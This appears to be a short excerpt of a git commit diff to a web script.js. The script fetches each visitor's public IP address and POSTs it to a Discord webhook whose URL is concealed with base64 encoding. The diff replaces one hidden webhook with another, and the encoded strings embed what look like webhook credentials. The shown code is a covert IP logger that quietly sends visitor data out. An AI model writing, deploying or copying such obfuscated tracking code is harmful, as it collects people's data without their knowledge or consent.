53e3c3866804452ceb5a943ba787136cf79cc61e
SwiftSki <49699645+SwiftSki@users.noreply.github.com>
2021-02-03 23:21:16 -0700

    Update script.js

--- script.js
+++ script.js
@@ -2,7 +2,7 @@ var ip;
 fetch('https://ifconfig.me/ip').then(res => res.text()).then(data => ip = data);
 function send(){
   let req = new XMLHttpRequest();
-  req.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODAzODU2NzM4NzkxOTgxMTA4L1g0WktUaEkyN3c3RWFnUFE2bjFHdk95Yk94eTBFV3YySDhrVk5yd2otYzM4d0lFSTkwdEVxb1hBazUtOWtid3gzcHJS"));
+  req.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODA2NzcwOTY3MDYxMzMxOTk4L3BBQ2Uyb1pXMlg4TUdXbnRQLVcwYzN2SU1VZnlDT3h1TGFwV1I3azNSaHFkZzRvS3NtNENuMW80dU9fYXlHQnNqLVJH"));
   req.setRequestHeader('Content-type', 'application/json');
   let params = {
     username: ip,
